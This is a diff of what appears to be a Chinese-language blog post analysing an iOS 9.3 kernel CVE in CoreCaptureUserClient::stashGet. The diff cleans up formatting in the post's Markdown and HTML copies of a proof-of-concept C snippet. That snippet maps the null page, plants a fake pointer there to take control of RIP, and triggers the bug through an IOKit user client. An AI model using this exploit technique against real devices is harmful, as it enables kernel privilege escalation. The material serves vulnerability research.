@@ -29,20 +29,20 @@
 翻看iOS9.3近期的security list的时候，选了这么一个CVE来研究一下，它的漏洞描述比较清晰，也能找到已有的POC代码帮助理解。  
 通过向`CoreCaptureUserClient::stashGet`传递一个人为控制的参数，可以让它返回一个空指针，这个空指针会被随后未经检查地调用(具体怎么调用还没有弄明白)，如果我们能够在空指针页填入数据，就可以达到控制RIP的目的。  
 <pre><code>int main(int argc, char** argv){
-  `kern_return_t err;`
+  kern_return_t err;
   // re map the null page rw
   int var = 0;
-  `err = vm_deallocate(mach_task_self(), 0x0, 0x1000);`
-  `if (err != KERN_SUCCESS){`
+  err = vm_deallocate(mach_task_self(), 0x0, 0x1000);
+  if (err != KERN_SUCCESS){
     printf("%x\n", err);
   }
-  `vm_address_t addr = 0;`
-  `err = vm_allocate(mach_task_self(), &addr, 0x1000, 0);`
-  `if (err != KERN_SUCCESS){`
-    `if (err == KERN_INVALID_ADDRESS){`
+  vm_address_t addr = 0;
+  err = vm_allocate(mach_task_self(), &addr, 0x1000, 0);
+  if (err != KERN_SUCCESS){
+    if (err == KERN_INVALID_ADDRESS){
       printf("invalid address\n");
     }
-    `if (err == KERN_NO_SPACE){`
+    if (err == KERN_NO_SPACE){
       printf("no space\n");
     }
     printf("%x\n", err);
@@ -51,12 +51,12 @@
   for (int i = 0; i < 0x1000; i++){
     np[i] = '\xff';
   }
-  `*((uint64_t*)0x28) = 0xffffff4141414141;`
+  *((uint64_t*)0x28) = 0xffffff4141414141;
   OSSpinLockLock(&lock);
-  `pthread_t t;`
-  `pthread_create(&t, NULL, thread_func, NULL);`
-  `mach_port_t conn = get_user_client("IOAudioEngine", 0);`
-  `set_params(conn);`
+  pthread_t t;
+  pthread_create(&t, NULL, thread_func, NULL);
+  mach_port_t conn = get_user_client("IOAudioEngine", 0);
+  set_params(conn);
   OSSpinLockUnlock(&lock);
   IOServiceClose(conn);
 }
@@ -126,20 +126,20 @@
 通过向<code>CoreCaptureUserClient::stashGet</code>传递一个人为控制的参数，可以让它返回一个空指针，这个空指针会被随后未经检查地调用(具体怎么调用还没有弄明白)，如果我们能够在空指针页填入数据，就可以达到控制RIP的目的。  </p>
 
 <pre><code>int main(int argc, char** argv){
-  `kern_return_t err;`
+  kern_return_t err;
   // re map the null page rw
   int var = 0;
-  `err = vm_deallocate(mach_task_self(), 0x0, 0x1000);`
-  `if (err != KERN_SUCCESS){`
+  err = vm_deallocate(mach_task_self(), 0x0, 0x1000);
+  if (err != KERN_SUCCESS){
     printf("%x\n", err);
   }
-  `vm_address_t addr = 0;`
-  `err = vm_allocate(mach_task_self(), &amp;addr, 0x1000, 0);`
-  `if (err != KERN_SUCCESS){`
-    `if (err == KERN_INVALID_ADDRESS){`
+  vm_address_t addr = 0;
+  err = vm_allocate(mach_task_self(), &amp;addr, 0x1000, 0);
+  if (err != KERN_SUCCESS){
+    if (err == KERN_INVALID_ADDRESS){
       printf("invalid address\n");
     }
-    `if (err == KERN_NO_SPACE){`
+    if (err == KERN_NO_SPACE){
       printf("no space\n");
     }
     printf("%x\n", err);
@@ -148,12 +148,12 @@
   for (int i = 0; i &lt; 0x1000; i++){
     np[i] = '\xff';
   }
-  `*((uint64_t*)0x28) = 0xffffff4141414141;`
+  *((uint64_t*)0x28) = 0xffffff4141414141;
   OSSpinLockLock(&amp;lock);
-  `pthread_t t;`
-  `pthread_create(&amp;t, NULL, thread_func, NULL);`
-  `mach_port_t conn = get_user_client("IOAudioEngine", 0);`
-  `set_params(conn);`
+  pthread_t t;
+  pthread_create(&amp;t, NULL, thread_func, NULL);
+  mach_port_t conn = get_user_client("IOAudioEngine", 0);
+  set_params(conn);
   OSSpinLockUnlock(&amp;lock);
   IOServiceClose(conn);
 }
